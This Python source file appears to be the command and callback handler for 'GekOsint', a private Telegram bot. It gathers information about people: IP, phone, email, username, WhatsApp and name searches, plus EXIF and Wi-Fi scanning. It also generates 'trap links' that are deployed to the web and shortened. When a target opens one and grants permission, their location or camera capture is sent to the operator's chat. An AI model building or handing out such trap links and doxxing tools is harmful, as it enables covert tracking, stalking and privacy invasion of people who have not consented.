from telegram import Update
from telegram.ext import ContextTypes
from ui.menus import main_menu, back_btn
from ui.templates import (
    format_ip_result, format_phone_result, format_username_result,
    format_email_result, format_exif_result, format_whatsapp_result,
    format_people_result, format_dns_result,
    format_geoloc_coords, format_geoloc_ip, format_geoloc_webrtc, format_wifi_scan
)
from modules.ip_lookup import get_ip_info
from modules.phone_lookup import analyze_phone
from modules.username_search import search_username
from modules.email_analysis import analyze_email
from modules.tracking import generate_tracking_page
from modules.exif_extract import get_exif
from modules.whatsapp_osint import analyze_whatsapp
from modules.people_search import search_people
from modules.dns_lookup import get_dns_info
from modules.geolocation import get_ip_geolocation, scan_wifi_networks, get_exif_data as geo_get_exif, check_webrtc_leak, extract_google_maps_location, comprehensive_geo_analysis
from utils.apis import deploy_html, shorten_url, generate_text_report
from utils.access import load_authorized_users, add_user, remove_user, get_all_users
from config import BOT_TOKEN, logger, ADMIN_ID
from datetime import datetime
import re
import asyncio

# --- Access Control ---
DENIED_MSG = (
    "🔒 <b>ACCESO DENEGADO</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "⛔ No tienes autorización para usar este bot.\n\n"
    "📋 <b>Tu información:</b>\n"
    "• ID: <code>{user_id}</code>\n"
    "• Nombre: {name}\n"
    "• Username: @{username}\n\n"
    "🛡️ <i>Este bot es privado. Solo usuarios autorizados pueden acceder.</i>\n"
    "📩 <i>Contacta al administrador si necesitas acceso.</i>"
)

def is_authorized(user_id: int) -> bool:
    """Verifica si el usuario está en la lista de autorizados."""
    return user_id in get_all_users()

async def check_access(update: Update, context: ContextTypes.DEFAULT_TYPE = None) -> bool:
    """Verifica acceso, envía denegación y notifica al admin."""
    user = update.effective_user
    if not user:
        return False
    
    if is_authorized(user.id):
        return True
    
    # Log del intento
    logger.warning(f"🚫 Acceso denegado: {user.first_name} (@{user.username}) ID:{user.id}")
    
    msg = DENIED_MSG.format(
        user_id=user.id,
        name=user.full_name or "N/A",
        username=user.username or "sin_username"
    )
    
    if update.callback_query:
        await update.callback_query.answer("🔒 Acceso denegado", show_alert=True)
    elif update.message:
        await update.message.reply_text(msg, parse_mode='HTML')
    
    # Notificar al admin sobre el intento de acceso no autorizado
    if context and ADMIN_ID:
        try:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            alert = (
                f"🚨 <b>INTENTO DE ACCESO</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Nombre:</b> {user.full_name}\n"
                f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
                f"📛 <b>Username:</b> @{user.username or 'N/A'}\n"
                f"🕐 <b>Hora:</b> {now}\n"
            )
            await context.bot.send_message(ADMIN_ID, alert, parse_mode='HTML')
        except Exception:
            pass
    
    return False

# --- Command Handlers ---
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando de administración para gestionar usuarios."""
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return

    args = context.args
    if not args:
        users = get_all_users()
        msg = (
            "🛡️ <b>Panel de Administración</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 <b>Usuarios autorizados:</b> {len(users)}\n"
            "<code>" + "\n".join([f"- {u}" for u in users]) + "</code>\n\n"
            "📝 <b>Comandos:</b>\n"
            "• <code>/admin add ID</code> — Añadir usuario\n"
            "• <code>/admin remove ID</code> — Eliminar usuario"
        )
        await update.message.reply_text(msg, parse_mode='HTML')
        return

    cmd = args[0].lower()
    if cmd == "add" and len(args) > 1:
        target_id = args[1]
        if add_user(target_id):
            await update.message.reply_text(f"✅ Usuario <code>{target_id}</code> añadido.", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ Error al añadir usuario.")
    
    elif cmd == "remove" and len(args) > 1:
        target_id = args[1]
        if remove_user(target_id):
            await update.message.reply_text(f"✅ Usuario <code>{target_id}</code> eliminado.", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ No se pudo eliminar el usuario (puede ser admin inicial).")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    
    user = update.effective_user.first_name
    txt = (
        f"👋 <b>Bienvenido, {user}</b>\n\n"
        f"🛡️ <b>GekOsint v5.0</b> — Sistema de Inteligencia OSINT\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔍 <b>IP Lookup</b> — Geoloc, WHOIS, puertos, blacklist\n"
        f"📱 <b>Phone Intel</b> — Operadora, ubicación, Truecaller\n"
        f"👤 <b>Username Search</b> — 50+ plataformas + Telegram\n"
        f"📧 <b>Email Analysis</b> — Reputación, brechas, DNS\n"
        f"💚 <b>WhatsApp OSINT</b> — Registro, spam, Business\n"
        f"🌍 <b>Geo Tracker</b> — Enlace trampa de ubicación\n"
        f"📸 <b>Camera Trap</b> — Captura de cámara remota\n"
        f"🖼️ <b>EXIF Data</b> — Metadatos, GPS, hash\n"
        f"🧑‍💼 <b>People Search</b> — Nombre → redes, dorks, OSINT\n"
        f"🌐 <b>Domain/DNS</b> — WHOIS, registros DNS, seguridad\n"
        f"🛰️ <b>Geo Localización</b> — IP, coordenadas, Maps, WebRTC\n"
        f"📶 <b>WiFi Scanner</b> — Redes cercanas para triangulación\n\n"
        f"<i>🔒 Acceso restringido — {len(get_all_users())} usuarios autorizados</i>"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(txt, reply_markup=main_menu(), parse_mode='HTML')
    else:
        await update.message.reply_text(txt, reply_markup=main_menu(), parse_mode='HTML')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# --- Callback Handler ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return

    if not await check_access(update, context):
        return

    await query.answer()
    data = query.data

    if data == 'start':
        await start(update, context)
        return

    if data == 'export_txt':
        last_result = context.user_data.get('last_result')
        if not last_result:
            await query.answer("No hay datos para exportar.", show_alert=True)
            return
        
        await query.answer("Generando reporte...")
        report = generate_text_report("OSINT Analysis", last_result)
        from io import BytesIO
        bio = BytesIO(report.encode())
        bio.name = f"GekOsint_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        await context.bot.send_document(query.message.chat_id, bio, caption="🛡️ Reporte generado por GekOsint v5.0")
        return

    # menu_about no requiere input del usuario
    if data == 'menu_about':
        context.user_data.pop('mode', None)
        about_txt = (
            "ℹ️ <b>GekOsint v5.0</b>\n\n"
            "🛡️ Sistema de Inteligencia OSINT\n"
            "📋 11 módulos activos\n"
            "🔒 Acceso restringido\n"
            "☁️ Cloud-Ready\n\n"
            "<i>Desarrollado para investigación ética. Uso responsable.</i>"
        )
        await query.edit_message_text(about_txt, reply_markup=back_btn(), parse_mode='HTML')
        return

    if data == 'menu_wifi':
        context.user_data.pop('mode', None)
        await query.edit_message_text("📶 <b>Escaneando redes Wi-Fi...</b>", parse_mode='HTML')
        data_wifi = await asyncio.to_thread(scan_wifi_networks)
        response = format_wifi_scan(data_wifi)
        context.user_data['last_result'] = response
        await context.bot.send_message(query.message.chat_id, response, parse_mode='HTML', reply_markup=back_btn(show_export=True))
        return

    prompts = {
        'menu_ip':     "📡 <b>IP Lookup</b>\n\nEnvía la dirección IP a investigar:",
        'menu_phone':  "📱 <b>Phone Intel</b>\n\nEnvía el número con código de país (ej: +52...).\n\n<i>Opcional: agrega una IP o hostname para analizar también (ej: +52... | 8.8.8.8) o (+52... | example.com)</i>",
        'menu_user':   "👤 <b>Username Search</b>\n\nEnvía el username a rastrear:",
        'menu_email':  "📧 <b>Email Analysis</b>\n\nEnvía el correo electrónico:",
        'menu_exif':   "🖼️ <b>EXIF Data</b>\n\nEnvía una foto como <b>DOCUMENTO</b> (sin compresión).",
        'menu_wa':     "💚 <b>WhatsApp OSINT</b>\n\nEnvía el número con código de país (ej: +52...):\n\n<i>Obtiene: nombre registrado, foto, tags, estado, links OSINT</i>",
        'menu_dns':    "🌐 <b>Domain/DNS</b>\n\nEnvía el dominio a investigar (ej: google.com):",
        'menu_people': (
            "🧑‍💼 <b>People Search</b>\n\n"
            "Envía el <b>nombre completo</b> a investigar:\n\n"
            "<i>Ej: Juan García\n"
            "Ej: María López Torres</i>\n\n"
            "🔍 Busca perfiles en 20+ redes, genera dorks, y enlaza bases OSINT."
        ),
        'menu_geoloc': (
            "🛰️ <b>Geo Localización</b>\n\n"
            "Elige una opción:\n\n"
            "1️⃣ Envía una <b>IP</b> para geolocalizar\n"
            "2️⃣ Envía <b>coordenadas</b> (lat,lon) para verificar\n"
            "3️⃣ Envía un <b>enlace de Google Maps</b> para extraer ubicación\n\n"
            "<i>Soporta: IP, coordenadas, URLs de Maps, análisis de EXIF</i>"
        ),
    }

    if data in prompts:
        context.user_data['mode'] = data
        await query.edit_message_text(prompts[data], reply_markup=back_btn(), parse_mode='HTML')
    
    # Manejo especial para trackers (acciones inmediatas)
    elif data in ['menu_geo', 'menu_cam']:
        await query.edit_message_text("⚙️ <b>Generando Enlace Trampa...</b>\n<i>(Esto puede tardar unos segundos)</i>", parse_mode='HTML')
        
        type_ = "geo" if data == 'menu_geo' else "cam"
        fname, html = generate_tracking_page(BOT_TOKEN, query.message.chat_id, type_)
        
        # Deploy (Asíncrono para no bloquear el bot)
        url = await deploy_html(html, fname)
        
        if url:
            short = await shorten_url(url)
            icon = "🌍" if type_ == "geo" else "📸"
            msg = (
                f"{icon} <b>Enlace {type_.upper()} Generado</b>\n\n"
                f"🔗 <code>{short}</code>\n\n"
                f"⚠️ <i>La información capturada llegará a este chat.</i>\n\n"
                f"📌 <b>Nota:</b> El usuario debe permitir permisos de ubicación/cámara"
            )
            await context.bot.send_message(query.message.chat_id, msg, parse_mode='HTML', reply_markup=back_btn())
        else:
            await context.bot.send_message(query.message.chat_id, "❌ Error al subir archivo. Intenta de nuevo.", reply_markup=back_btn())

# --- Message Handler ---
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    
    mode = context.user_data.get('mode')
    text = update.message.text
    
    if not mode:
        return  # Ignorar mensajes sin contexto

    msg = await update.message.reply_text("⏳ <b>Procesando...</b>", parse_mode='HTML')
    
    try:
        response = None
        
        if mode == 'menu_ip':
            data = await asyncio.to_thread(get_ip_info, text.strip())
            response = format_ip_result(data)
            
        elif mode == 'menu_phone':
            raw = (text or "").strip()

            ip_token = None
            m = re.search(r'(?i)\bip\s*[:=]\s*([^\s]+)', raw)
            if m:
                ip_token = m.group(1).strip()
            if not ip_token:
                m4 = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', raw)
                if m4:
                    ip_token = m4.group(0)
            if not ip_token:
                m6 = re.search(r'\b(?:[0-9a-f]{0,4}:){2,7}[0-9a-f]{0,4}\b', raw, flags=re.IGNORECASE)
                if m6:
                    ip_token = m6.group(0)

            host_token = None
            mh = re.search(r'(?i)\b(?:host|hostname|domain|dominio)\s*[:=]\s*([^\s]+)', raw)
            if mh:
                host_token = mh.group(1).strip()
            if not host_token and not ip_token:
                cleaned_for_host = raw
                for sep in ["|", ",", ";", "\n", "\r", "\t"]:
                    cleaned_for_host = cleaned_for_host.replace(sep, " ")
                for tok in cleaned_for_host.split():
                    t = tok.strip()
                    if not t or t.startswith("+") or "@" in t:
                        continue
                    if t.lower().startswith(("http://", "https://")):
                        t = t.split("://", 1)[1]
                    t = t.split("/", 1)[0].split("?", 1)[0].split("#", 1)[0].strip()
                    if "." not in t:
                        continue
                    if re.match(r"^[a-z0-9.-]+\.[a-z]{2,63}$", t, flags=re.IGNORECASE):
                        host_token = t
                        break

            phone_token = None
            cleaned = raw
            for sep in ["|", ",", ";", "\n", "\r", "\t"]:
                cleaned = cleaned.replace(sep, " ")
            for tok in cleaned.split():
                digits = re.sub(r"\D", "", tok)
                if len(digits) >= 7 and "." not in tok and "/" not in tok:
                    phone_token = tok
                    break

            data = await asyncio.to_thread(analyze_phone, (phone_token or raw).strip())
            intel_target = ip_token or host_token
            if intel_target:
                data["ip_intel_target"] = intel_target
                data["ip_intel"] = await asyncio.to_thread(get_ip_info, intel_target)
            response = format_phone_result(data)
            
        elif mode == 'menu_user':
            found, telegram_data = await asyncio.to_thread(search_username, text.strip())
            response = format_username_result(text, found, telegram_data)
            
        elif mode == 'menu_email':
            data = await asyncio.to_thread(analyze_email, text.strip())
            response = format_email_result(data)

        elif mode == 'menu_wa':
            data = await asyncio.to_thread(analyze_whatsapp, text.strip())
            response = format_whatsapp_result(data)

        elif mode == 'menu_dns':
            data = await asyncio.to_thread(get_dns_info, text.strip())
            response = format_dns_result(data)

        elif mode == 'menu_people':
            data = await asyncio.to_thread(search_people, text.strip())
            response = format_people_result(data)

        elif mode == 'menu_geoloc':
            text_clean = text.strip()
            
            if re.match(r'^-?\d+\.\d+,\s*-?\d+\.\d+$', text_clean):
                parts = text_clean.split(',')
                lat, lon = float(parts[0].strip()), float(parts[1].strip())
                data = {
                    "type": "coordinates",
                    "lat": lat,
                    "lon": lon,
                    "map_url": f"https://www.google.com/maps?q={lat},{lon}",
                    "address": "Consultando..."
                }
                response = format_geoloc_coords(data)
            elif text_clean.startswith('http'):
                if 'maps.google' in text_clean or 'goo.gl' in text_clean:
                    coords = extract_google_maps_location(text_clean)
                    if coords:
                        data = {
                            "type": "google_maps_url",
                            "lat": coords["lat"],
                            "lon": coords["lon"],
                            "map_url": coords["map_url"],
                            "original_url": text_clean
                        }
                        response = format_geoloc_coords(data)
                    else:
                        response = "❌ No se pudieron extraer coordenadas del enlace."
                else:
                    webrtc = await asyncio.to_thread(check_webrtc_leak, text_clean)
                    data = {
                        "type": "webrtc_check",
                        "url": text_clean,
                        "result": webrtc
                    }
                    response = format_geoloc_webrtc(data)
            elif re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text_clean) or re.match(r'^[a-f0-9:]+$', text_clean, re.IGNORECASE):
                data = await asyncio.to_thread(get_ip_geolocation, text_clean)
                response = format_geoloc_ip(data)
            else:
                response = "❌ Formato no reconocido. Envía: IP, coordenadas (lat,lon), o URL de Google Maps."
            context.user_data['last_result'] = response

        elif mode == 'menu_exif':
            # El modo exif se mantiene activo hasta recibir una imagen;
            # si el usuario envía texto, se recuerda la instrucción.
            await msg.edit_text(
                "🖼️ <b>EXIF Data</b>\n\nEnvía la imagen como <b>DOCUMENTO</b> (no como foto comprimida).",
                parse_mode='HTML', reply_markup=back_btn()
            )
            return

        if response is None:
            await msg.delete()
            return

        context.user_data['last_result'] = response
        await msg.edit_text(response, parse_mode='HTML', disable_web_page_preview=True, reply_markup=back_btn(show_export=True))
        context.user_data.pop('mode', None)
        
    except Exception as e:
        logger.error(f"Error en handler: {e}")
        await msg.edit_text(f"❌ Error: {str(e)}", reply_markup=back_btn())

# --- Document/Photo Handler (EXIF) ---
async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    
    if context.user_data.get('mode') != 'menu_exif':
        return
    
    msg = await update.message.reply_text("⏳ <b>Descargando y analizando...</b>", parse_mode='HTML')
    
    try:
        from io import BytesIO
        
        # Obtener el archivo (ya sea documento o foto)
        if update.message.document:
            file_obj = await update.message.document.get_file()
        elif update.message.photo:
            # Usar la foto con mayor resolución (la última en la lista)
            file_obj = await update.message.photo[-1].get_file()
        else:
            await msg.edit_text("❌ Por favor envía una imagen.", reply_markup=back_btn())
            return

        out = BytesIO()
        await file_obj.download_to_memory(out)
        byte_array = out.getvalue()
        
        data = await asyncio.to_thread(get_exif, byte_array)
        response = format_exif_result(data)
            
        context.user_data['last_result'] = response
        await msg.edit_text(response, parse_mode='HTML', reply_markup=back_btn(show_export=True))
        
    except Exception as e:
        logger.error(f"Error EXIF: {e}")
        await msg.edit_text(f"❌ Error procesando imagen: {e}", reply_markup=back_btn())
